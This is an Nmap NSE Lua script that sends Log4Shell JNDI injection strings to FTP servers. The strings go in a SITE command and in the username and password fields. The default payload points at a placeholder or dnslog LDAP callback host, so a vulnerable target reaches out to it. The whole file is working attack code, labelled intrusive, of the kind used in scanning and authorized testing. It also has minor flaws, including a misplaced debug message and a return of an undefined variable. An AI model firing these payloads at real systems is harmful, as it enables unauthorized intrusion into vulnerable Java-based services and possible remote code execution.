local shortport = require "shortport"
local stdnse = require "stdnse"
local ftp = require "ftp"

description = [[
Performs log4shell attack against FTP servers.
]]

---
-- @usage
-- nmap --script ftp-log4shell -p 21 <host>

author = "Vlatko Kosturjak"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive","log4shell"}

portrule = shortport.port_or_service(21, "ftp")

local arg_timeout = stdnse.parse_timespec(stdnse.get_script_args(SCRIPT_NAME .. ".timeout"))
arg_timeout = (arg_timeout or 5) * 1000

action = function( host, port )
    local payload = stdnse.get_script_args(SCRIPT_NAME..".payload")
    local gpayload = stdnse.get_script_args("log4shell.payload")

    if not payload then
      if not gpayload then
	if nmap.registry['dnslog-cn'] then
	   stdnse.debug2("registry not present")
	   local registry = nmap.registry['dnslog-cn']
	   if registry.domain then
		 payload = "${jndi:ldap://{{target}}."..registry.domain.."}"
	   else
		 stdnse.debug2("session not present")
	   end
	else
	   payload = "${jndi:ldap://mydomain/uri}"
	end
	stdnse.debug1("Setting the payload to default payload:"..payload)
      else
	payload=gpayload
      end
    end

    local socket, code, message, buffer = ftp.connect(host, port, {request_timeout=arg_timeout})
    if not socket then
      return "Couldn't connect to host: " .. (code or message)
    end
    local user = payload
    local pass = payload

    local buffer = stdnse.make_buffer(socket, "\r?\n")

    if not socket:send("SITE %s \r\n", payload) then
      return nil
    end
    code, message = ftp.read_reply(buffer)
    if not code then
      stdnse.debug1("SITE error: %s", message)
    end

    local status, code, message = ftp.auth(socket, buffer, user, pass)

    stdnse.debug1("Sent payload: "..payload.." and got "..message)

    if not status then
      if not code then
	return "socket error during login: " .. message
      elseif code == 530 then
	ftp.close(socket)
	return
      elseif code == 421 then
	ftp.close(socket)
	return "Too many connections"
      else
	ftp.close(socket)
	stdnse.debug1("WARNING: Unhandled response: %d %s", code, message)
	return "WARNING: Unhandled response"
      end
    end
  stdnse.debug1("Weird. Successful login: %s/%s", user, pass)
  ftp.close(socket)
  return result
end
